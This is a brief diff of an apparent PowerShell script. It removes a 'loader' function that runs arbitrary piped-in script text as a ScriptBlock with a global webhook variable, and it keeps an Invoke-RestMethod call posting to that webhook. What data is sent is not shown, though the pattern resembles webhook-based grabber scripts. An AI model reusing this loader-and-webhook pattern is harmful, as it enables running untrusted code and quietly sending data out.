@@ -1,26 +1,5 @@
-function loader {
-    param(
-        [Parameter(ValueFromPipeline = $true)]
-        [string]$ScriptText,
-
-        [string]$WEBHOOK
-    )
-
-    if (-not $ScriptText) {
-     
-        return
-    }
-
-
-    Set-Variable -Name "WEBHOOK" -Value $WEBHOOK -Scope Global
-
-  
-    $block = [ScriptBlock]::Create($ScriptText)
-
-    
-    & $block
-}
-
+# Use this line if you intrested in typing your webhook inside file;
+# $WEBHOOK =""
 
 
 
@@ -54,5 +33,6 @@ Invoke-RestMethod -Uri $WEBHOOK `
     }
     
 }
+
 
 
